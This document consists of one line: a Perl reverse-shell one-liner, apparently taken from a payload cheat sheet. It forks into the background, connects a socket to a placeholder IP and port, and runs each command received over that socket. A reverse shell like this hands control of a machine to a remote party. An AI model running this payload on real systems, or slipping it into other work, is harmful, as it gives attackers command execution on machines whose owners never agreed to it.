perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
